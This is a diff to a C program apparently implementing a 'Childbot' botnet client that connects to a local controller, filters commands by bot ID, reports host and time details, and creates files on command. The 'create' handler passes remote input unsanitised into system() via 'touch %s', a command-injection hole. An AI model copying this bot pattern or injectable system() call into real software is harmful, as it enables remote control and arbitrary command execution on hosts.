@@ -43,11 +43,9 @@ int main(int argc, char **argv)
    client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    clientaddr.sin_family = AF_INET;
    clientaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
-   clientaddr.sin_port = htons(60001);
+   clientaddr.sin_port = htons(atoi(argv[2]));
 
    client_len = sizeof(clientaddr);
-
-   printf("%s:%s:%s:%s:%s\n",buf.sysname,buf.nodename,buf.release,buf.version,buf.machine);
 
    if(connect(client_sockfd, (struct sockaddr *)&clientaddr, client_len) < 0)
    {
@@ -55,7 +53,7 @@ int main(int argc, char **argv)
        exit(0);
    }
 
-   strncpy(id,"11",2);
+   strncpy(id,argv[1],2);
 
    write(client_sockfd,id,2);
 
@@ -81,41 +79,48 @@ int main(int argc, char **argv)
            {
                temp = strtok(NULL," ");
                strncpy(bot_number,temp,sizeof(temp));
-               temp = strtok(NULL," ");
-               strncpy(read_option,temp,sizeof(temp));
-               if(strstr(read_option,"host"))
+
+               if(bot_number[0] == id[0] && bot_number[1] == id[1])
                {
-                   sprintf(hostname,"Childbot #%c%c : %s:%s:%s:%s:%s",id[0],id[1],buf.sysname,buf.nodename,buf.release,buf.version,buf.machine);
-                   write(client_sockfd,hostname,sizeof(hostname));
-                   printf("write complete\n");
-               }
-               else if(strstr(read_option,"date"))
-               {
-                   time(&now);
-                   sprintf(date,"Childbot #%c%c : %s",id[0],id[1],ctime(&now));
-                   write(client_sockfd,date,sizeof(date));
+                   temp = strtok(NULL," ");
+                   strncpy(read_option,temp,sizeof(temp));
+                   if(strstr(read_option,"host"))
+                   {
+                       sprintf(hostname,"Childbot #%c%c : %s:%s:%s:%s:%s",id[0],id[1],buf.sysname,buf.nodename,buf.release,buf.version,buf.machine);
+                       write(client_sockfd,hostname,sizeof(hostname));
+                   }
+                   else if(strstr(read_option,"date"))
+                   {
+                       time(&now);
+                       sprintf(date,"Childbot #%c%c : %s",id[0],id[1],ctime(&now));
+                       write(client_sockfd,date,sizeof(date));
+                   }
                }
            }
            else if(strstr(instruction,"create"))
            {
                temp = strtok(NULL," ");
                strncpy(bot_number,temp,sizeof(temp));
-               temp = strtok(NULL," ");
-               strncpy(route,temp,sizeof(route));
-               for(i=0;i<sizeof(route);i++)
-               {
-                   if(route[i] == '\n')
-                   {
-                       route[i] = '\0';
-                       break;
-                   }
-               }
-               sprintf(makefile,"touch %s",route);
 
-               if(system(makefile) == 0)
-                   write(client_sockfd,"file creation complete",22);
-               else
-                   write(client_sockfd,"file creation fail",18);
+               if(bot_number[0] == id[0] && bot_number[1] == id[1])
+               {
+                   temp = strtok(NULL," ");
+                   strncpy(route,temp,sizeof(route));
+                   for(i=0;i<sizeof(route);i++)
+                   {
+                       if(route[i] == '\n')
+                       {
+                           route[i] = '\0';
+                           break;
+                       }
+                   }
+                   sprintf(makefile,"touch %s",route);
+    
+                   if(system(makefile) == 0)
+                       write(client_sockfd,"file creation complete",22);
+                   else
+                       write(client_sockfd,"file creation fail",18);
+               }
            }
        }
    }
